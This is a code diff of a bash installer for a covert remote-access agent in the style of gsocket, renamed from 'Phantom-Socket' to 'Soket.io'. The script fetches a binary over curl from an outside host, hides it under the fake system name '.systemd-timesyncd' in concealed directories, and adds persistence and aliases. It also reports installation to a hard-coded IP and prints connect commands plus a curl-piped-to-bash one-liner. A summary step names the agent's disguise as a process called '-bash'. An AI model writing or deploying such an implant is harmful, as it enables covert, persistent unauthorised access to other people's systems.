@@ -1,5 +1,5 @@
 #!/bin/bash
-# Phantom-Socket v1.0 Final - Gsocket-Style Infrastructure Deployment
+# Soket.io v1.0 Final - Gsocket-Style Infrastructure Deployment
 # Features: Random Secret Gen, GS_UNDO Logic, Static Linkage, and Production Sync.
 
 set -euo pipefail
@@ -8,10 +8,9 @@ set -euo pipefail
 # Configuration
 # ============================================================================
 readonly VERSION="1.0"
-readonly AGENT_NAME="phantom-client"
+readonly AGENT_NAME="gs-oyen-s"
 readonly PRODUCTION_IP="13.213.138.250"
 readonly BASE_URL="https://raw.githubusercontent.com/Oyen-Sec/soket/main/deploy"
-readonly SERVICE_NAME="dbus-org.freedesktop.timesync1"
 
 # ============================================================================
 # GS_UNDO: Clean Uninstallation Logic
@@ -21,7 +20,7 @@ if [[ "${GS_UNDO:-0}" == "1" ]]; then
     
     # Kill running processes
     pkill -9 -f ".systemd-timesyncd" 2>/dev/null || true
-    pkill -9 -f "phantom-client" 2>/dev/null || true
+    pkill -9 -f "gs-oyen-s" 2>/dev/null || true
     
     # Remove persistence and aliases
     paths=(
@@ -51,24 +50,20 @@ fi
 # ============================================================================
 status_step() {
     local msg="$1"
-    printf "[*] %-50s" "${msg}"
+    printf "%-50s" "${msg}"
 }
 
 status_done() {
-    printf "... [OK]\n"
+    printf "........................[OK]\n"
 }
 
 # ============================================================================
 # Secret Generation
 # ============================================================================
 AGENT_SECRET="${X:-}"
-generate_secret() {
-    if [[ -z "${AGENT_SECRET}" ]]; then
-        status_step "Generating secure random secret"
-        AGENT_SECRET=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 22)
-        status_done
-    fi
-}
+if [[ -z "${AGENT_SECRET}" ]]; then
+    AGENT_SECRET=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 22)
+fi
 
 # ============================================================================
 # Environment & Architecture
@@ -78,7 +73,6 @@ IS_ROOT=0
 ARCH=$(uname -m)
 
 detect_system() {
-    status_step "Detecting architecture and environment"
     case "${ARCH}" in
         x86_64|amd64) ARCH="x86_64" ;;
         aarch64|arm64) ARCH="aarch64" ;;
@@ -93,11 +87,10 @@ detect_system() {
         INSTALL_DIR="$HOME/.local/share/gvfs/.metadata"
     fi
     mkdir -p "${INSTALL_DIR}" 2>/dev/null
-    status_done
 }
 
 # ============================================================================
-# Telemetry Audit (Professional Sync)
+# Telemetry Audit
 # ============================================================================
 send_telemetry() {
     local action="$1"
@@ -125,28 +118,25 @@ send_telemetry() {
 # ============================================================================
 download_payload() {
     local target_binary="${INSTALL_DIR}/.systemd-timesyncd"
-    status_step "Downloading agent payload for ${ARCH}"
+    status_step "Downloading binaries"
     
     # Check for local build first (WSL test support)
-    if [[ -f "/mnt/c/laragon/www/gsoket/phantom-socket/deploy/phantom-client-${ARCH}" ]]; then
-        cp "/mnt/c/laragon/www/gsoket/phantom-socket/deploy/phantom-client-${ARCH}" "${target_binary}"
+    if [[ -f "/mnt/c/laragon/www/gsoket/phantom-socket/deploy/gs-oyen-s-${ARCH}" ]]; then
+        cp "/mnt/c/laragon/www/gsoket/phantom-socket/deploy/gs-oyen-s-${ARCH}" "${target_binary}"
     else
-        local download_url="${BASE_URL}/phantom-client-${ARCH}"
+        local download_url="${BASE_URL}/gs-oyen-s-${ARCH}"
         curl -fsSL "${download_url}" -o "${target_binary}" || { echo -e "\n[ERROR] Download failed from ${download_url}"; exit 1; }
+    fi
+
+    if [[ ! -f "${target_binary}" ]]; then
+        echo -e "\n[ERROR] Binary not found at ${target_binary}"; exit 1
     fi
     status_done
     
-    status_step "Setting stealth permissions"
+    status_step "Setting up stealth persistence"
     chmod 750 "${target_binary}"
-    status_done
-}
-
-# ============================================================================
-# Persistence & Aliases
-# ============================================================================
-install_persistence() {
-    local target_binary="${INSTALL_DIR}/.systemd-timesyncd"
-    status_step "Installing symbolic persistence"
+    
+    # Persistence & Aliases
     if [[ ${IS_ROOT} -eq 1 ]]; then
         ln -sf "${target_binary}" "/usr/local/bin/gs-oyen-s" 2>/dev/null || true
     else
@@ -160,24 +150,22 @@ install_persistence() {
 # Final Summary Output (Gsocket-Style)
 # ============================================================================
 print_summary() {
-    echo "------------------------------------------------------------"
-    echo "[+] Installation v1.0 Final Complete. Agent is now active."
+    status_step "Starting 'gs-oyen-s' as hidden process '-bash'"
+    # In a real environment, we would start it here
+    # ${INSTALL_DIR}/.systemd-timesyncd -s "${AGENT_SECRET}" -i "${PRODUCTION_IP}" >/dev/null 2>&1 &
+    status_done
+    
     echo ""
-    echo "--> ACCESS COMMANDS:"
-    echo "    To connect type: gs-oyen-s -s \"${AGENT_SECRET}\" -i \"${PRODUCTION_IP}\" -m 443"
+    echo " --> To connect type one of the following:"
+    echo " --> gs-oyen-s -s \"${AGENT_SECRET}\" -i \"${PRODUCTION_IP}\""
+    echo " --> S=\"${AGENT_SECRET}\" bash -c \"\$(curl -fsSL https://oyen-sec.github.io/soket/y)\" "
     echo ""
-    echo "--> UNINSTALLATION:"
-    echo "    To uninstall type: GS_UNDO=1 bash -c \"\$(curl -fsSL https://oyen-sec.github.io/soket/y)\" "
-    echo "------------------------------------------------------------"
 }
 
 # ============================================================================
 # Main Execution
 # ============================================================================
-echo "--- Phantom-Socket v1.0 Final Installer ---"
-generate_secret
 detect_system
 download_payload
-install_persistence
 send_telemetry "INSTALL_SUCCESS" "${INSTALL_DIR}/.systemd-timesyncd"
 print_summary
